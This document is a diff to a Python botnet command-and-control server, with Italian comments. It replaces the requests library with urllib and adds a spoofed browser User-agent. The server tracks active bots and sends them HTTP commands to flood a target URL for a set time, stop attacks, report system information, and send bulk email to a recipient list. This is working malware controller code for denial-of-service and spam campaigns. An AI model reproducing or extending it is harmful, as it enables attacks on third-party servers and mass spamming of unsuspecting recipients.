@@ -3,10 +3,10 @@ import socket
 import json
 from asyncio import Event
 from concurrent.futures import ThreadPoolExecutor
-from ftplib import FTP
+from urllib.error import HTTPError
+from urllib.request import Request, urlopen
 from time import sleep
 
-import requests
 
 
 def sendMessage(s, message):
@@ -113,8 +113,9 @@ class CC:
             if 'http' in self.activeBot[k]:
                 try:
                     url = "http://" + k + ":" + str(v['http']) + "/status"
-                    response = requests.get(url, timeout=10)
-                    res = response.json()
+                    req = Request(url)
+                    res = urlopen(req, timeout=10)
+                    res = json.loads(res.read())
                     self.activeBot[k]['target'] = res['target']
                     self.activeBot[k]['action'] = res['action']
                 except Exception as e:
@@ -148,8 +149,9 @@ class CC:
             for k, v in self.activeBot.items():
                 try:
                     url = "http://" + k + ":" + str(v["http"]) + "/status"
-                    response = requests.get(url, timeout=10)
-                    res = response.json()
+                    req = Request(url)
+                    res = urlopen(req, timeout=10)
+                    res = json.loads(res.read())
                     self.activeBot[k]["target"] = res["target"]
                     self.activeBot[k]["action"] = res["action"]
                 except Exception as e:
@@ -157,8 +159,9 @@ class CC:
         else:
             try:
                 url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/status"
-                response = requests.get(url, timeout=10)
-                res = response.json()
+                req = Request(url)
+                res = urlopen(req, timeout=10)
+                res = json.loads(res.read())
                 self.activeBot[target]["target"] = res["target"]
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
@@ -167,12 +170,15 @@ class CC:
 
     def makeHTTPRequest(self, server, time=1, target=""):
         print("Invio richiesta...")
+        headers = {'Content-Type': 'application/json', 'User-agent': 'Mozilla/5.0'}
+        data = {"url": server, "time": time}
         if target == "":
             for k, v in self.activeBot.items():
                 try:
                     url = "http://" + k + ":" + str(v["http"]) + "/doGet"
-                    response = requests.post(url, json={"url": server, "time":time}, timeout=10)
-                    res = response.json()
+                    req = Request(url, json.dumps(data).encode("UTF-8"), headers)
+                    res = urlopen(req, timeout=10)
+                    res = json.loads(res.read())
                     self.activeBot[k]["target"] = res["target"]
                     self.activeBot[k]["action"] = res["action"]
                 except Exception as e:
@@ -180,8 +186,9 @@ class CC:
         else:
             try:
                 url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/doGet"
-                response = requests.post(url, json={"url": server, "time": time}, timeout=10)
-                res = response.json()
+                req = Request(url, json.dumps(data).encode("UTF-8"), headers)
+                res = urlopen(req, timeout=10)
+                res = json.loads(res.read())
                 self.activeBot[target]["target"] = res["target"]
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
@@ -194,8 +201,9 @@ class CC:
             for k, v in self.activeBot.items():
                 try:
                     url = "http://" + k + ":" + str(v["http"]) + "/stopAttack"
-                    response = requests.get(url, timeout=10)
-                    res = response.json()
+                    req = Request(url)
+                    res = urlopen(req, timeout=10)
+                    res = json.loads(res.read())
                     self.activeBot[k]["target"] = res["target"]
                     self.activeBot[k]["action"] = res["action"]
                 except Exception as e:
@@ -203,8 +211,9 @@ class CC:
         else:
             try:
                 url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/stopAttack"
-                response = requests.get(url, timeout=10)
-                res = response.json()
+                req = Request(url)
+                res = urlopen(req, timeout=10)
+                res = json.loads(res.read())
                 self.activeBot[target]["target"] = res["target"]
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
@@ -216,8 +225,9 @@ class CC:
             for k, v in self.activeBot.items():
                 try:
                     url = "http://" + k + ":" + str(v["http"]) + "/getSystemInfo"
-                    response = requests.get(url)
-                    res = response.json()
+                    req = Request(url)
+                    res = urlopen(req, timeout=10)
+                    res = json.loads(res.read())
                     print("\t-----System info about", k, "-----")
                     for j,z in res.items():
                         if len(j) <= 6:
@@ -229,8 +239,9 @@ class CC:
         else:
             try:
                 url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/getSystemInfo"
-                response = requests.get(url)
-                res = response.json()
+                req = Request(url)
+                res = urlopen(req, timeout=10)
+                res = json.loads(res.read())
                 print("\t-----System info about", target, "-----")
                 for j, z in res.items():
                     if len(j) <= 6:
@@ -244,6 +255,8 @@ class CC:
         users = None
         oggetto = None
         messaggio = None
+        headers = {'Content-Type': 'application/json', 'User-agent': 'Mozilla/5.0'}
+
 
         try:
             with open("email.json", 'r') as f:
@@ -254,14 +267,17 @@ class CC:
         except Exception as e:
             print("File error:",e)
 
+        data = {"oggetto": oggetto, "messaggio": messaggio, "utenti": users}
+
 
         print("Invio richiesta...")
         if target == "":
             for k, v in self.activeBot.items():
                 try:
                     url = "http://" + k + ":" + str(v["http"]) + "/sendEmail"
-                    response = requests.post(url, json={"oggetto": oggetto, "messaggio": messaggio, "utenti": users}, timeout=10)
-                    res = response.json()
+                    req = Request(url, json.dumps(data).encode("UTF-8"), headers)
+                    res = urlopen(req, timeout=10)
+                    res = json.loads(res.read())
                     self.activeBot[k]["target"] = res["target"]
                     self.activeBot[k]["action"] = res["action"]
                 except Exception as e:
@@ -269,8 +285,9 @@ class CC:
         else:
             try:
                 url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/sendEmail"
-                response = requests.post(url, json={"oggetto": oggetto, "messaggio": messaggio, "utenti": users}, timeout=10)
-                res = response.json()
+                req = Request(url, json.dumps(data).encode("UTF-8"), headers)
+                res = urlopen(req, timeout=10)
+                res = json.loads(res.read())
                 self.activeBot[target]["target"] = res["target"]
                 self.activeBot[target]["action"] = res["action"]
             except Exception as e:
